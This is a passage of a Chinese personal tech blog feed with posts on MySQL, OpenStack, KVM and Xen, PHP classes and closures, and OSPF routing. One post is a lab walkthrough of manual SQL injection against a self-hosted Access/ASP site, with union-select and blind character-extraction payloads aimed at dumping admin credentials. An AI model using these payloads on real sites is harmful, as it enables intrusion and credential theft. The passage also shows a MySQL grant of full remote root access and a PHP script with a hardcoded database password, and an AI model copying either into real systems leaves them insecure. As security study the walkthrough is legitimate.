sec)</code></pre><p>搞定！</p><p><strong>授权所有权限远程登录</strong></p><pre><code>GRANT ALL ON *.* TO &apos;root&apos;@&apos;%&apos; WITH GRANT OPTION;8.0版本的授权命令</code></pre><p>刷新权限</p><pre><code>mysql&gt; flush privileges;</code></pre>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简述openstack</title>
      <link href="/2018/10/08/cloud02/"/>
      <url>/2018/10/08/cloud02/</url>
      
        <content type="html"><![CDATA[<p>大家好，我顾某人又回来了。<br><strong>以下内容均为个人理解和整理，有不对的地方还望dalao指正。。。。。</strong><br>本文所用图片均已标明来源。</p><p><strong>openstack是什么？</strong><br>OpenStack是一个开源的云计算管理平台项目，由几个主要的组件组合起来完成具体工作。OpenStack支持几乎所有类型的云环境，项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。</p><p><strong>openstack组成</strong><br>openstack由以下七个主要部分组成：</p><ul><li>Nova：计算服务</li><li>Neutron：网络管理服务</li><li>Keystone：认证服务</li><li>Swift：对象存储服务</li><li>Cinder：块存储服务</li><li>Glance：镜像管理服务</li><li>Horizon：操作界面</li></ul><p><strong>openstack整体架构</strong><br>图源网络<br><img alt data-src="https://image.3001.net/images/20181123/15429714047540.png" class="lozad"></p><p><strong>openstack组成详解</strong></p><blockquote><p><strong>Nova</strong></p></blockquote><p>Nova提供CPU、内存、网络适配器和硬件驱动器等服务器资源虚拟化的功能，提高了资源的利用率。<br>通过Nova api来接受和响应用户的请求，实时对VM进行启动、挂起、停止等功能。<br>Nova主要包含的组件有：</p><ul><li>Nova-api<br>响应用户的请求</li><li>Nova-scheduler<br>负责VM的调度，决定了VM运行在哪台主机上。</li><li>Nova-compute<br>管理VM实例的生命周期</li><li>Nova-conductor<br>计算服务与数据库的交互中介，避免直接访问数据库</li><li>Nova-console<br>提供访问VM的控制台</li><li>Nova-consoleauth<br>负责对VM控制台的请求提供Token认证</li><li>Nova-cert<br>提供证书</li><li>Hypervisor<br>虚拟化管理程序，用于实现硬件的虚拟化</li><li>database<br>用于存放一些Nova的数据</li><li>message queue<br>用于Nova子服务之间的相互协调和通信</li></ul><blockquote><p><strong>Neutron</strong></p></blockquote><p>Neutron架构，图源CloudMan<br><img alt data-src="https://image.3001.net/images/20181123/15429714066102.jpg" class="lozad"><br>Neutron通过<code>plugin</code>和<code>agent</code>提供的网络服务。<br>调用网络的API分为以下两种：</p><ul><li>Core API<br>对外提供<code>network</code>、<code>subnet</code>和<code>port</code>的API</li><li>Resource and Attribute Extension API<br>对外提供管理<code>router</code>、<code>load balance</code>、<code>firewall</code>等资源的API。</li></ul><p>Neutron的<code>plugin</code>分为<code>Neutron Core Plugins</code>和<code>Neutron Service Plugins</code>。</p><ul><li>Neutron Core Plugins<br>Neutron的核心插件，实现<code>Core API</code>在数据库中维护<code>network</code>、<code>subnet</code>和<code>port</code>的状态，并负责调用相应的<code>agent</code>在<code>network provider</code>上执行相关操作.</li><li>Neutron Service Plugins<br>Neutron的扩展插件，实现<code>Extension Plugin API</code>，在数据库中维护<code>router</code>、<code>load balance</code>、<code>security group</code>等资源的状态，并负责调用相应的<code>agent</code>在<code>network provider</code>上执行相关操作.</li></ul><p>Message Queue:消息队列<br>用于<code>Plugins</code>和<code>Agent</code>相互之间的调用.</p><blockquote><p><strong>Keystone</strong></p></blockquote><p>keystone为openstack组件提供认证服务和管理用户及其权限。<br>keystone中有几个重要的概念要了解一下：User（用户）、Role（角色）、Tenant（租户）、Service（服务）。</p><ul><li>User   用户，keystone的授权用户</li><li>Role   角色，表示用户可以访问资源的权限</li><li>Tenant 租户，各个服务中可以访问的资源合集</li><li>Service 服务，租户可以提供的服务</li></ul><p>keystone的运作流程大概是这样的：当User想要去访问某个Service时，首先他要向keystone出示它的Credentials，Keystone认证之后会给User一个Token，然后User就可以使用这个Token去访问Service，这时这个Service就会向keystone去验证User的Token，如果验证成功，那么User就成功访问到Service中的Endpoint，且User的Role越高，访问到的Service越多。<br>通俗的来讲是这样的：<br>User|住酒店的人<br>|:-|:-<br>Tenant|酒店<br>Credentials|酒店房间钥匙<br>Authentication|房客认证机制<br>Token|发给能打开房间的人的凭证，用于享受酒店的服务<br>Service|酒店提供的一种服务<br>Endpoint|酒店提供服务中的具体服务<br>Role|酒店会员等级</p><blockquote><p><strong>Swift</strong></p></blockquote><p>Swift为OpenStack提供一种分布式、持续虚拟对象存储,主要用于存储大的对象文件,比如虚拟机的备份。</p><blockquote><p><strong>Cinder</strong></p></blockquote><p>openstack的一种块存储方式，挂载给虚拟机使用，可以给虚拟机提供额外的空间。<br><strong>swift和cinder的比较</strong><br><code>swift</code>类似于保存PC的系统，而<code>cinder</code>类似于保存PC里面的文件。</p><blockquote><p><strong>Glance</strong></p></blockquote><p>openstack中用于保存创建VM的镜像,比如，现在现在需要安装一个<code>win7</code>的操作系统给公司的某个员工使用，按照传统的操作方式需要花费大量时间，但是现在在云环境中，只需要直接从<code>glance</code>中按模板启动<code>win7</code>即可，二七人只许耗费几秒钟的时间<br><code>glance</code>包括<code>glance-api</code>、<code>glance-registry</code>和<code>store backend</code>.</p><ul><li>glance-api<br>对外提供API，用于响应<code>image</code>的查询、获取等调用。</li><li>glance-registry<br>用于处理和存取<code>image</code>的的元数据，例如大小、类型等，并且戴护具对应到<code>Database</code>。</li><li>store backend<br>用于存放<code>image</code>。</li></ul><blockquote><p><strong>Horizon</strong></p></blockquote><p>简单的来说，Horizon是一个web接口，用于将openstack的资源聚集到一起并进行图形化管理。</p>]]></content>
      
      
      <categories>
          
          <category> Cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloud </tag>
            
            <tag> openstack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简述KVM架构和Xen架构</title>
      <link href="/2018/10/08/cloud01/"/>
      <url>/2018/10/08/cloud01/</url>
      
        <content type="html"><![CDATA[<p><strong>以下均为个人理解，如果有不对的地方还望各位dalao不吝赐教。</strong></p><h1 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h1><p>虚拟化是通过Hypervisor程序实现的，Hypervisor的作用是将硬件虚拟化提供给多个操作系统使用，是虚拟化技术的核心。<br>虚拟化分为两种：<code>1型虚拟化</code>和<code>2型虚拟化</code>。</p><ul><li><code>1型虚拟化</code>是将Hypervisor直接安装在物理机上，然后虚拟机直接运行在Hypervisor上，<code>Xen</code>就是属于<code>1型虚拟化</code>。</li><li><code>2型虚拟化</code>是先在硬件上安装操作系统，然后将Hypervisor作为系统的一个程序运行在系统上从而实现对虚拟机的管理，<code>KVM</code>就是属于<code>2型虚拟化</code>。</li></ul><hr><h1 id="KVM架构"><a href="#KVM架构" class="headerlink" title="KVM架构"></a>KVM架构</h1><p><img alt data-src="https://image.3001.net/images/20181123/15429713363665.jpg" class="lozad"><br>先来看一下<code>KVM</code>，KVM是基于<code>Linux</code>内核实现的，<code>KVM</code>的内核模块叫做<code>kvm.ko</code>，实现对<code>Linux</code>的CPU和内存虚拟化，是<code>Linux</code>的一个进程，负责<code>VCPU</code>和<code>内存</code>的分配,而其他设备的虚拟就交给了<code>qemu</code>。<br><code>qemu</code>运行在用户空间，<code>KVM</code>运行在内核，两者通过<code>/dev/kvm</code>进行交互。<br><code>KVM</code>仅支持全局虚拟化。</p><hr><h1 id="Xen架构"><a href="#Xen架构" class="headerlink" title="Xen架构"></a>Xen架构</h1><p><img alt data-src="https://image.3001.net/images/20181123/15429713386970.jpg" class="lozad"><br>再来看一下<code>Xen</code>，<code>Xen</code>支持全虚拟化和半虚拟化，（<code>全虚拟化</code>就是运行在虚拟环境的虚拟机无法感知到自己是运行在虚拟环境之上，只会觉得自己是运行在硬件之上，<code>半虚拟化</code>是运行在虚拟环境的虚拟机可以感知到自己不是直接运行在硬件环境之上）这一点不同于<code>KVM</code>的仅支持全局虚拟化。<code>Xen</code>是直接运行在硬件上的，也就是上面提到的<code>1型虚拟化</code>，直接对硬件进行虚拟化，然后在硬件之上直接跑虚拟机，在<code>Xen</code>架构中的虚拟机分为两种：<code>Domain0</code>和<code>DoaminU</code>.<code>Domain0</code>又叫做<code>特权虚拟机</code>，具有直接访问硬件和管理其他操作系统的权限，而<code>DoaminU</code>就是普通的虚拟机，<code>DoaminU</code>不能直接访问硬件，所有的操作都是通过驱动发送到特权虚拟机<code>Domain0</code>，由<code>Domain0</code>去和硬件交互再返回给普通用户，所以，<code>Xen</code>架构的虚拟化需要先运行<code>Domain0</code>。<br><code>Xen</code>架构也是对<code>CPU</code>和<code>内存</code>进行虚拟化,提供给虚拟机用，其余硬件访问是通过<code>特权虚拟机</code>直接与硬件进行交互再返回的。<br>默认<code>Domain0</code>VCPU和内存的大小是这样计算的：</p><blockquote><p><code>Domain0的VCPU = 物理设备线程数 % 10</code>然后向上取最小的一个偶数，就是<code>Domain0</code>的VCPU数。<br>Domain0的内存：如果物理设备的内存小于96G，那么就默认为8G,如果物理机的内存大于96G，那么<code>Domain0的内存 = 物理机内存  *0.05 + 8G</code>。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Cloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloud </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP接口</title>
      <link href="/2018/10/06/php08/"/>
      <url>/2018/10/06/php08/</url>
      
        <content type="html"><![CDATA[<p>PHP接口（<code>interface</code>）作用类似于继承中的父类，接口是用于给其他的类继承用的，但是接口中定义的方法都是没有方法体的且定义的方法必须是公有的。<br>举例：</p><pre><code>&lt;?php    interface iTemplate{        public function eat($food);        public function learn($code);    }    class student implements iTemplate{        public function eat($food){            echo &quot;student eat {$food}&quot;;        }        public function learn($code){            echo &quot;student learn {$code}&quot;;        }    }    $student = new student();    $student-&gt;eat(&apos;apple&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;learn(&apos;PHP&apos;);?&gt;</code></pre><p>输出：</p><pre><code>student eat applestudent learn PHP</code></pre><p>接口中除了方法也是可以定义属性的，但必须是常量。</p><pre><code>&lt;?php    interface iTemplate{        public function eat($food);        public function learn($code);        const A=&apos;我是常量&apos;;    }    class student implements iTemplate{        public function eat($food){            echo &quot;student eat {$food}&quot;;        }        public function learn($code){            echo &quot;student learn {$code}&quot;;        }        public function changliang(){            echo ITemplate::A;        }    }    $student = new student();    $student-&gt;eat(&apos;apple&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;learn(&apos;PHP&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;changliang();?&gt;</code></pre><p>输出：</p><pre><code>student eat applestudent learn PHP我是常量</code></pre><p>那么既然是定义给其他类使用，就存在继承的问题，接口是可以多继承的。<br>举例：</p><pre><code>&lt;?php    interface iTemplate1{        public function eat($food);    }    interface iTemplate2{        public function learn($code);    }    class student implements iTemplate1,iTemplate2{        public function eat($food){            echo &quot;student eat {$food}&quot;;        }        public function learn($code){            echo &quot;student learn {$code}&quot;;        }    }    $student = new student();    $student-&gt;eat(&apos;apple&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;learn(&apos;PHP&apos;);?&gt;</code></pre><p>输出：</p><pre><code>student eat applestudent learn PHP</code></pre><p>这样就在<code>student</code>类中继承了<code>iTemplate1</code>和<code>iTemplate2</code>接口,话可以先让<code>iTemplate2</code>接口继承<code>iTemplate1</code>接口，再让<code>student</code>类去继承<code>iTemplate1</code>接口，实现的效果同上。<br>举例：</p><pre><code>&lt;?php    interface iTemplate1{        public function eat($food);    }    interface iTemplate2 extends iTemplate1{        public function learn($code);    }    class student implements iTemplate2{        public function eat($food){            echo &quot;student eat {$food}&quot;;        }        public function learn($code){            echo &quot;student learn {$code}&quot;;        }    }    $student = new student();    $student-&gt;eat(&apos;apple&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;learn(&apos;PHP&apos;);?&gt;</code></pre><p>输出：</p><pre><code>student eat applestudent learn PHP</code></pre><p>总结一下：</p><ul><li>接口不能实例化</li><li>接口中的方法不能有方法体</li><li>继承接口的方法必须实现接口中的所有方法</li><li>一个类可以继承多个接口</li><li>接口中的属性必须是常量</li><li>接口中的方法必须是public（默认public）</li></ul><p>不对的地方还望dalao们指正。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP继承</title>
      <link href="/2018/10/06/php07/"/>
      <url>/2018/10/06/php07/</url>
      
        <content type="html"><![CDATA[<p><strong>以下都是我个人的理解，有错的地方还望不吝赐教。</strong><br><strong>为什么需要继承？</strong><br>继承就是 一个子类通过extends父类把父类的属性和方法继承下来。<br>假设现在现在需要写两个类，小学生类和高中生类，小学生会说话，走路，考试，高中生也会说话走路，考试，那么如果你写两遍说话，走路，考试，那么就会显得臃肿，管理起来也会麻烦很多，如果定义一个类叫做学生类包含说话，走路，考试，然后让小学生类和高中生类来继承这个学生类就会显得好很多，比如这样。</p><pre><code>&lt;?phpclass student{    function speak(){        echo &apos;说话&apos;;    }    function walk(){        echo &apos;走路&apos;;    }    function test(){        echo &apos;考试&apos;;    }}class pupil extends student{    function test(){        echo &apos;小学生考试&apos;;    }}class senior extends student{    function test(){        echo &apos;高中生考试&apos;;    }}$pupil=new pupil();$pupil-&gt;speak();$pupil-&gt;walk();$pupil-&gt;test();echo &apos;&lt;br /&gt;&apos;;$senior=new senior();$senior-&gt;speak();$senior-&gt;walk();$senior-&gt;test();?&gt;</code></pre><p>输出：</p><pre><code>说话走路小学生考试说话走路高中生考试</code></pre><p>这样代码管理起来就会好很多。<br>假设现在小学生要学习一个新的技能吃东西，我现在这样写。</p><pre><code>&lt;?php    class student{        function speak(){            echo &apos;说话&apos;;        }        function walk(){            echo &apos;走路&apos;;        }        function test(){            echo &apos;考试&apos;;        }    }    class skill{        function eat(){            echo &apos;吃东西&apos;;        }    }    class pupil extends student，skill{        function test(){            echo &apos;小学生考试&apos;;        }    }    $pupil=new pupil();    $pupil-&gt;speak();    $pupil-&gt;walk();    $pupil-&gt;test();    $pupil-&gt;eat();?&gt;</code></pre><p>如果这样写，那么就会报错：</p><pre><code>Fatal error: Class &apos;studentskill&apos; not found in D:\xampp\htdocs\1.php on line 18</code></pre><p>因为php中是不能这样实现多继承的，如果想要实现多继承可以这么写：</p><pre><code>&lt;?php        class student{            function speak(){                echo &apos;说话&apos;;            }            function walk(){                echo &apos;走路&apos;;            }            function test(){                echo &apos;考试&apos;;            }        }        class skill extends student{            function eat(){                echo &apos;吃东西&apos;;            }        }        class pupil extends skill{            function test(){                echo &apos;小学生考试&apos;;            }        }        $pupil=new pupil();        $pupil-&gt;speak();        $pupil-&gt;walk();        $pupil-&gt;test();        $pupil-&gt;eat();?&gt;</code></pre><p>输出:</p><pre><code>说话走路小学生考试吃东西</code></pre><p>先用一个skill类继承student类，然后再用pupil类继承skill类，这样就相当于pupil类继承了student类和skill类。</p><p><strong>方法重写</strong><br>如果要实现的两个类有共同特征，那么就可以将这个共同的特征抽象出一个父类。<br>比如，有小学生类和中学生类，这样的两个类，他们都是学生，那么就可以抽象出一个学生类，学生都会考试，那么就把考试这个方法写在学生这个类里面。<br>那么问题就是，小学生是小学生的考试，中学生是中学生的考试，我不可能都输出考试，这里就用到了方法重写。<br>在子类中定义一个与父类一样的方法，这样执行的时候，父类中的方法就会被覆盖，从而输出的只有子类中定义的方法。<br>举例：</p><pre><code>&lt;?php        class student{            function test(){                echo &apos;考试&apos;;            }        }        class pupil extends student{            function test(){                echo &apos;小学生考试&apos;;            }        }        class senior extends student{            function test(){                echo &apos;中学生考试&apos;;            }        }        $pupil=new pupil();        $pupil-&gt;test();        echo &apos;&lt;br /&gt;&apos;;        $senior=new senior();        $senior-&gt;test();?&gt;</code></pre><p>输出：</p><pre><code>小学生考试中学生考试</code></pre>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP匿名函数</title>
      <link href="/2018/10/06/php06/"/>
      <url>/2018/10/06/php06/</url>
      
        <content type="html"><![CDATA[<p>匿名函数（Anonymous functions），也叫闭包函数（closures），允许临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值。</p><p>举例：</p><pre><code>&lt;?php    $greet=function($name){        echo &apos;Hello &apos;.$name;    };    $greet(&apos;World!&apos;);?&gt;</code></pre><p>这样会输出</p><pre><code>Hello World!</code></pre><p>假设现在要在匿名函数中调用普通的变量：</p><pre><code>&lt;?php    $name=&apos;Hello World!&apos;;    $greet=function(){        echo $name;    };    $greet();?&gt;</code></pre><p>如果是这么使用，那么就会报一个错误：</p><pre><code>PHP Notice:  Undefined variable: name in /code/main.php on line 4</code></pre><p>应该是这么使用：</p><pre><code>&lt;?php    $name=&apos;Hello World!&apos;;    $greet=function() use ($name){        echo $name;    };    $greet();?&gt;</code></pre><p>这样就会返回</p><pre><code>Hello World!</code></pre><p>以上理解如果有不对的地方，还望dalao们指正。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP实现类似题库抽题效果</title>
      <link href="/2018/10/06/php05/"/>
      <url>/2018/10/06/php05/</url>
      
        <content type="html"><![CDATA[<p>大家好，我顾某人又回来了，最近学了一点PHP，然后就想写个简单小例子试试，于是就写了一个类似于从题库抽题的东西，大概就是先输入需要抽题的数量，然后从数据库中随机抽取题目。<br>希望各位大佬轻喷。<br>假设我现在有这样一个题库：<br><img alt data-src="https://image.3001.net/images/20181123/1542972400459.jpg" class="lozad"><br>啊？为什么要用英文？，因为我，，没搞定编码问题😭。<br>接着我来进行抽题：<br><img alt data-src="https://image.3001.net/images/20181123/15429724026277.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429724043043.jpg" class="lozad"><br>这样就随机抽出了三道题目。</p><hr><p>现在来说说我的思路，希望各位大佬不吝赐教。<br>首先要实现这个功能，<strong>首先</strong>我需要三个页面，一个是用户输入页面<code>input.html</code>，一个是后台处理页面<code>select.php</code>，还有一个是错误警告页面<code>error.html</code>（如果用户输入为空，或者输入的抽题数量超过了题库的数量那么就报错），<strong>然后</strong>是数据库，数据库分为两列，一列是<code>question</code>，用来存放题目，另一列是<code>id</code>，用于标识<code>question</code>。</p><p>然后对用户的输入进行判断：<br><img alt data-src="https://image.3001.net/images/20181123/1542972406294.jpg" class="lozad"></p><hr><p><code>input.html</code>页面：</p><pre><code>&lt;html&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;    &lt;form action=&quot;select.php&quot; method=&quot;get&quot;&gt;        请输入要随机生成的题数：&lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;        &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;提交&quot; /&gt;    &lt;/form&gt;&lt;/html&gt;</code></pre><p><code>error.html</code>页面：</p><pre><code>&lt;html&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;    &lt;p&gt;您的输入有误，请重新输入！&lt;/p&gt;&lt;/html&gt;</code></pre><p><code>select.php</code>页面：</p><pre><code>&lt;?php    header(&quot;Content-type:text/html;charset=utf8&quot;);    $connect=new mysqli(&apos;localhost&apos;,&apos;wy&apos;,&apos;000000&apos;,&apos;test&apos;);    if(!$connect){        die(&quot;数据库连接失败！&quot;);    }                           //连接数据库    $sql=&quot;select id from test&quot;;    $result=$connect-&gt;query($sql);    $array=array();    $i=0;    while($row=$result-&gt;fetch_row()){        foreach($row as $val){            $array[$i]=$val;             $i ++;        }    }                          //将题目id存放进一个数组array    $input=$_GET[&apos;input&apos;];    //接受用户的输入    if(empty($input) || $input&gt;count($array)){  //判断用户的输入是否为空或输入大于题库数量        header(&quot;Location:error.html&quot;);    //输入有误重定向到错误提示页面    }else{        shuffle($array);    //将存放题目id的数组进行随机排序        $k=0;               //用于取出rand数组中question时的id        for($j=0;$j&lt;$input;$j++){            $rand=array_slice($array,0,$input);     //从数组的第一个数开始，取出用户输入数量个id存放进一个数组            $sql2=&quot;select * from test where id=&apos;{$rand[$k]}&apos;&quot;;  //查找rand数组中每一个id对应的question            $result2=$connect-&gt;query($sql2);    //存放mysql语句返回的结果集            while($row2=$result2-&gt;fetch_assoc()){                echo $row2[&apos;question&apos;];     //返回question对应的内容                echo &apos;&lt;br /&gt;&apos;;            }            $k++;        }        $result2-&gt;free();   //释放内存    }    $result-&gt;free();        //释放内存    $connect-&gt;close();      //关闭连接?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Access手工注入</title>
      <link href="/2018/09/23/Access%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/09/23/Access%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>哈哈哈哈，，，我顾北清又回来啦，接着更新。<br>实验环境：win2008R2虚拟机，物理机（也就是我的win10）。<br>搭建环境用的是access+asp源码。</p><p>环境搭建可以参照<a href="https://www.cnblogs.com/Timesi/p/9362651.html" target="_blank" rel="noopener">这里</a>，不同的是在第六步勾选<code>应用程序开发</code>选项。<br>环境搞完之后大概是这个样子的：<br><img alt data-src="https://image.3001.net/images/20181123/15429730656216.jpg" class="lozad"><br>接着来手工注入一下。<br>首先判断有没有注入点，随便点进一个页面：<br><img alt data-src="https://image.3001.net/images/20181123/15429730685639.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429730705639.jpg" class="lozad"><br><code>%20</code>是空格的转码。<br><code>and 1=1</code>没有出错，再来试试<code>and 1=2</code>。<br><img alt data-src="https://image.3001.net/images/20181123/15429730728173.jpg" class="lozad"><br>出错了，说明它将这条语句带入查询了，说明存在注入点。</p><p>1.联合查询法<br>先判断字段长度，使用<code>order by 猜测的长度</code>。<br>我这里猜测长度是22（因为我事先知道/滑稽脸，所以命令是<code>order by 22</code>。<br><img alt data-src="https://image.3001.net/images/20181123/15429730734852.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429730761981.jpg" class="lozad"><br>判断到22的时候是正常的，到23的时候报错了，说明，字段长度是22。<br>然后来猜解表名，使用的命令是：<code>union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</code>.<br><code>admin</code>是我猜解的表名。<br><img alt data-src="https://image.3001.net/images/20181123/15429730787882.jpg" class="lozad"><br>发现这里爆出一个<code>3</code>和<code>15</code>,说明<code>3</code>和<code>15</code>这两个位置存在数据，接着来用猜解的数据替换这两个位置。<br><img alt data-src="https://image.3001.net/images/20181123/15429730809078.jpg" class="lozad"><br>图中的<code>admin</code>和<code>password</code>是猜解的字段，如果此阿姐正确就会爆出这两个位置的数据，这样就拿到了账号密码。</p><p>2.逐字猜解法<br>首先判断是否存在某个表：<br>这里使用的命令是<code>and exists ( select * from admin)</code>,判断是否存在<code>admin</code>表。<br><img alt data-src="https://image.3001.net/images/20181123/15429730811010.jpg" class="lozad"><br>没有报错，说明存在<code>admin</code>表，接着来判断<code>admin</code>表中的字段，这里使用<code>and exists ( select admin from admin)</code>命令判断在<code>admin</code>表中是否存在<code>admin</code>字段。<br><img alt data-src="https://image.3001.net/images/20181123/15429730838443.jpg" class="lozad"><br>没有报错说明存在，接着看看有没有<code>password</code>字段。<br><img alt data-src="https://image.3001.net/images/20181123/15429730869419.jpg" class="lozad"><br>发现也没有报错，说明存在。<br>然后判断这两个字段对应数据的长度。<br>因为我事先知道对应关系，所里我就直接判断<code>admin</code>的长度是5，<code>password</code>的长度是16。<br>使用语句是<code>and (select top 1 len(列名) from admin)=长度值</code>。<br>可以使用<code>and (select top 1 len(列名) from admin)&gt;长度值</code>来缩小范围。<br><img alt data-src="https://image.3001.net/images/20181123/15429730886605.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429730898548.jpg" class="lozad"><br>这样我就判断出了数据的长度，然后根据数据长度反推数据。<br>使用的命令是<code>and (select top 1 asc(mid(列名，第几位，1)) from admin)=长度值</code>,这里的长度值是ASCII码。<br><img alt data-src="https://image.3001.net/images/20181123/15429730914866.jpg" class="lozad"><br>我使用的命令是<code>and (select top 1 asc(mid(admin，1，1)) from admin)=97</code><br>可以看到没有报错，这里<code>97</code>对应的是<code>a</code>，而我的<code>admin</code>列里的数据是<code>admin</code>,刚好对应，如果换成98，那么就会报错。<br>以此类推，猜解出数据。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>外部调用类的私有属性</title>
      <link href="/2018/09/23/php04/"/>
      <url>/2018/09/23/php04/</url>
      
        <content type="html"><![CDATA[<p>先来了解一下PHP类中的<code>__get</code>和<code>__set</code>函数<br>当试图获取一个不可达属性时，类会自动调用<code>__get</code>函数。<br>当试图设置一个不可达属性时，类会自动调用<code>__set</code>函数。</p><p>首先，来看一下<code>__get</code>函数，先来获取一个可达属性试试：</p><pre><code>&lt;?php    class A{        public $a=1;        private $b=2;        function __get($name){            echo &apos;you can get &apos;.$name;        }    }    $dy = new A();    echo $dy-&gt;a;?&gt;</code></pre><p>看一下它的返回：</p><pre><code>1</code></pre><p>没有问题，没有调用<code>__get</code>函数，现在我来访问一个私有的不可达属性：</p><pre><code>&lt;?php    class A{        public $a=1;        private $b=2;        function __get($name){            echo &apos;you can get &apos;.$name;        }    }    $dy = new A();    echo $dy-&gt;b;?&gt;</code></pre><p>会发现：</p><pre><code>you can get b</code></pre><p>说明这里调用了<code>__get</code>函数，我再来看一下<code>__set</code>函数，同样也是先使用可达的<code>public</code>属性：</p><pre><code>&lt;?php    class A{        public $a;        private $b;        function __set($name,$val){            echo &apos;you can get &apos;.$name.$val;        }    }    $dy = new A();    $dy-&gt;a = 1;    echo $dy-&gt;a;?&gt;</code></pre><p>看一下输出：</p><pre><code>1</code></pre><p>使用成功，没有问题，接着我们来使用私有属性：</p><pre><code>&lt;?php    class A{        public $a;        private $b;        function __set($name,$val){            echo &apos;you can get &apos;.$name.$val;        }    }    $dy = new A();    $dy-&gt;b = 1;    echo $dy-&gt;b;?&gt;</code></pre><p>这时看到：</p><pre><code>you can get b1PHP Fatal error:  Cannot access private property A::$b in /usercode/file.php on line 11</code></pre><p>这里调用了<code>__set</code>函数并提示我们不能使用类的私有属性。<br>现在来通过<code>__set</code>函数实现外部使用私有属性：</p><pre><code>&lt;?php    class A{        public $a;        private $b;        function __set($name,$val){                $this-&gt;$name=$val;        }        function B(){            echo $this-&gt;b;        }    }    $dy = new A();    $dy-&gt;b = 1;    $dy-&gt;B();?&gt;</code></pre><p>看一下输出：</p><pre><code>1</code></pre><p>说明使用成功。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSPF单区域配置</title>
      <link href="/2018/09/23/router06/"/>
      <url>/2018/09/23/router06/</url>
      
        <content type="html"><![CDATA[<p><strong>实验环境：华为模拟器eNSP</strong><br>现在有这样一个拓扑图：<br><img alt data-src="https://image.3001.net/images/20181123/15429729269257.jpg" class="lozad"><br>我想要让<code>R1</code>可以<code>ping</code>通<code>R3</code>,显然目前是不行的：</p><pre><code>&lt;R1&gt;ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Request time out    Request time out    Request time out    Request time out    Request time out--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    0 packet(s) received    100.00% packet loss</code></pre><p>查看一下路由器<code>R1</code>的路由表：</p><pre><code>&lt;R1&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public        Destinations : 4        Routes : 4        Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface    127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0    127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Ethernet0/0/0    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Ethernet0/0/0</code></pre><p>发现只有自己的IP地址，说明<code>ping</code>不通是正常的，现在我们来配置OSPF来让<code>R1</code>可以<code>ping</code>通<code>R3</code>。</p><pre><code>&lt;R1&gt;sy[R1]ospf    //启用ospf进程[R1-ospf-1]area 0      //区域号[R1-ospf-1-area-0.0.0.0]network 192.168.1.0 0.0.0.255   //宣告路由</code></pre><hr><pre><code>&lt;R2&gt;sy[R2]ospf[R2-ospf-1]area 0    [R2-ospf-1-area-0.0.0.0]network 192.168.1.0 0.0.0.255[R2-ospf-1-area-0.0.0.0]network 192.168.2.0 0.0.0.255</code></pre><hr><pre><code>&lt;R3&gt;sy[R3]ospf[R3-ospf-1]area 0    [R3-ospf-1-area-0.0.0.0]network 192.168.2.0 0.0.0.255</code></pre><p>这样就配好了，去<code>R1</code>上查看一下路由表：</p><pre><code>&lt;R1&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public        Destinations : 5        Routes : 5        Destination/Mask    Proto   Pre  Cost      